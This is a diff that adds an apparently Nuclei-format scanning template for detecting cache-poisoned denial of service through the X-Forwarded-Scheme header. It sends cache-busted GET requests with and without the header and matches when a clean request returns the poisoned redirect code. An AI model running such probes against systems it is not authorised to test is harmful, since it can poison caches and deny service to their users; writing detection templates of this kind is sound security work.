@@ -1,0 +1,33 @@
+id: X_Forwarded_Scheme_header_CPDoS
+info:
+  name: Compare Response Codes
+  author: raff
+  severity: high
+  description: Fuzzing 
+
+http:
+  - raw:
+      - |
+        GET {{BaseURL}}?cachetest11=H1raff11 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET {{BaseURL}}?cachetest22=H1raff22 HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Scheme: http 
+      - |
+        GET {{BaseURL}}?cachetest22=H1raff22 HTTP/1.1
+        Host: {{Hostname}}
+        X-Forwarded-Scheme: http 
+      - |
+        GET {{BaseURL}}?cachetest22=H1raff22 HTTP/1.1
+        Host: {{Hostname}}    
+    req-condition: true
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code_4 == status_code_3 && status_code_4 != status_code_1'
+          - 'status_code_4 == 301 || status_code_4 == 302 || status_code_4 == 307 || status_code_4 == 308'
+          - 'status_code_1 != 429 && status_code_1 != 403'
+        condition: and
